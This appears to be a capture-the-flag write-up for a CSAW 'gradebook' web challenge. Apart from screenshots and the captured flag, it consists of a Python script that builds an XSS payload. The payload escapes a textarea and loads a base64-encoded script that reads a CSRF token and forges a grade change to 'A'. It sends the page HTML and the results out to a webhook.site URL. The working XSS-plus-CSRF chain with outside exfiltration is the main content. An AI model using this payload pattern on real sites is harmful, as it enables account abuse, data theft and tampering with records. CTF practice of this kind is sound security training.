
<img width="664" height="416" alt="image" src="https://github.com/user-attachments/assets/ab144e77-7118-427e-917b-882e9d252f4d" />


<img width="743" height="158" alt="image" src="https://github.com/user-attachments/assets/0b3f65b8-ff3e-42e7-8002-5f48c277109d" />


<img width="943" height="157" alt="image" src="https://github.com/user-attachments/assets/716f57ad-c272-4ad6-879c-00102934a673" />

<img width="916" height="628" alt="image" src="https://github.com/user-attachments/assets/b201e952-83bd-4ed1-b34e-d3e5ccad137b" />

<img width="1865" height="684" alt="image" src="https://github.com/user-attachments/assets/f697cc86-6819-438b-b59c-11fea88abb08" />

```
import base64

class_ids = [
    "93bf63a7-c8ad-4092-bd32-136944ad9584",
    "bb7b4ab6-7e43-4e04-914d-f1c5f897dfa5",
    "d9c836fd-a5ca-4d44-a241-e8428447e5cf",
    "8938a046-e7c5-4402-84b7-36980f2eede6",
    "278614a5-3c34-41a9-9e30-3f4b0b621f9b"
]

student_id = "757729e2-45e5-4dfb-be55-814da78f4936"


def generate_xss_payload():
    # Your exact JavaScript code
    js_code = """
fetch('https://gradebook-app.ctf.csaw.io/grade-change',{method:'GET',credentials:'include'})
.then(r=>r.text())
.then(d=>{
    new Image().src='https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?html='+btoa(d);
    const t=new DOMParser().parseFromString(d,'text/html').querySelector('input[name="csrf_token"]').value;
    fetch('https://gradebook-app.ctf.csaw.io/grade-change',{
        method:'POST',
        credentials:'include',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body:new URLSearchParams({
            csrf_token:t,
            student_id:'757729e2-45e5-4dfb-be55-814da78f4936',
            class_id:'8938a046-e7c5-4402-84b7-36980f2eede6',
            grade:'A'
        })
    }).then(r=>r.text()).then(r=>{new Image().src='https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?result='+btoa(r)})
})
.catch(err=>{
    new Image().src='https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?error='+btoa(err.message)
});
"""
    js_code = ' '.join(js_code.split()).replace(' {', '{').replace(' }', '}')
    js_b64 = base64.b64encode(js_code.encode('utf-8')).decode('ascii')
    payload = f'</textarea><script src="data:application/javascript;base64,{js_b64}"></script>'
    return payload


xss_payload = generate_xss_payload()
print(xss_payload)

```



flag: `csawctf{y0u_m@de_the_h@cking_h0n0r_r0ll}`
